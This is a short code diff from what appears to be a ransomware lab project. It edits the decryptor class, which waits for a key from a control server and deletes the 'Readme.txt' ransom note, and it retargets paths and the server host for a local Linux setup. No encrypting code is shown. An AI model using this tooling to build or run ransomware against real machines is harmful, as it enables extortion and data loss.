@@ -38,8 +38,8 @@ class Decoder:
             return response.get('key')
 
     def delete_readme(self):
-
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        desktop_path = os.path.join(os.environ['HOME'], 'Desktop') # Debian Linux
+        #desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') # Windows
         readme_path = os.path.join(desktop_path, 'Readme.txt')
 
         if os.path.exists(readme_path):
@@ -51,8 +51,8 @@ class Decoder:
         gc.collect()
         print("Memory cleared.")
 def main():
-    directory = 'dosyalar/'  # Replace with the target directory path
-    server_host = '10.0.2.37'
+    directory = 'rw_target/'  # Replace with the target directory path
+    server_host = '127.0.0.1' # Verify this in the ControlServer output
     server_port = 12345
     print("Waiting for key...")
 
